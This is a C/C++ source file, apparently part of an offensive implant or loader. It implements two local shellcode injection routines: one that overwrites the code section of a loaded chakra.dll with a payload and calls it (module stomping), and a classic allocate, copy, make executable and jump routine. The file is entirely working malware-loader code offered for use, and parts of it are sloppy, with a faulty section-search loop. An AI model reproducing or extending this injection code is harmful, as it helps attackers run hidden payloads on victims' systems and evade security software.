#include <windows.h>

#include <Macros.h>
#include <Config.h>

VOID Classic( 
    PVOID  ShellcodeBytes,
    UINT64 ShellcodeSize 
);

VOID Stomper( 
    PVOID  ShellcodeBuffer,
    UINT64 ShellcodeSize
);

VOID LocalInjection(
    PVOID  ShellcodeBytes,
    UINT64 ShellcodeSize
) {
#ifdef INJECTION_STOMPER
   Stomper( ShellcodeBytes, ShellcodeSize );
#endif
#ifdef INJECTION_CLASSIC
   Classic( ShellcodeBytes, ShellcodeSize );
#endif
}

#ifdef INJECTION_STOMPER

VOID Stomper( 
    PVOID  ShellcodeBuffer,
    UINT64 ShellcodeSize
) {
    STOMP_AGRS            StompArgs = { 0 };
    PVOID                 MmBase    = { 0 };
    PIMAGE_NT_HEADERS     Header    = { 0 };
    PIMAGE_SECTION_HEADER SecHdr    = { 0 };
    NTSTATUS              Status    = { 0 };
    ULONG                 Protect   = { 0 };
    HANDLE                Thread    = { 0 };
    BOOL                  bCheck    = FALSE;
    HANDLE                hFile     = INVALID_HANDLE_VALUE;
    HANDLE                hSection  = INVALID_HANDLE_VALUE;
    PVOID                 ModuleMap = NULL;
    UINT64                ViewSize  = NULL;
    MmBase = Instance.Win32.LoadLibraryExA( "chakra.dll", NULL, DONT_RESOLVE_DLL_REFERENCES );
    if ( !MmBase ) return;

    Header = C_PTR( U_PTR( MmBase ) + ( ( PIMAGE_DOS_HEADER ) MmBase )->e_lfanew );

    SecHdr = IMAGE_FIRST_SECTION( Header );
    for ( ULONG i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        if ( strcmp( C_PTR( SecHdr[ i ].Name ), ".text" ) ) { // todo: encrypt string ".text"
            break;
        }
    }

    MmBase = (UINT64)(MmBase) + SecHdr->VirtualAddress; //todo: get address of entrypoint
    Instance.Win32.BlackoutMain = MmBase;

    StompArgs.Length = ShellcodeSize;

    Instance.Win32.VirtualProtect( MmBase, SecHdr->SizeOfRawData, PAGE_READWRITE, &Protect );
    
    MmCopy( MmBase, ShellcodeBuffer, ShellcodeSize );

    bCheck = Instance.Win32.VirtualProtect( MmBase, SecHdr->SizeOfRawData, Protect, &Protect );
    if ( !bCheck ) return;
    
    Instance.Win32.BlackoutMain( &StompArgs );

    return 0;
}
#endif

#ifdef INJECTION_CLASSIC

VOID Classic( 
    PVOID  ShellcodeBytes,
    UINT64 ShellcodeSize 
) {
    DWORD  OldProtection  = 0;
    DWORD  ThreadId       = 0;
    HANDLE TargetProcess  = 0;

    PVOID  ShellcodeMemory = NULL;

    ShellcodeMemory =  bkCall<PVOID>( "Kernel32", "VirtualAlloc", NULL, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );

    if ( ! ShellcodeMemory ) return 0;

    bkMemory::Copy( ShellcodeMemory, ShellcodeBytes, ShellcodeSize );

    bkCall<PVOID>( "Kernel32", "VirtualProtect", ShellcodeMemory, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );

    ((ShellcodeMain)ShellcodeMemory)( 0 ); //Instance.Win32.WaitForSingleObject( Instance.Win32.CreateThread( NULL, NULL, ShellcodeMemory, NULL, NULL, NULL ), INFINITE ); //
}

#endif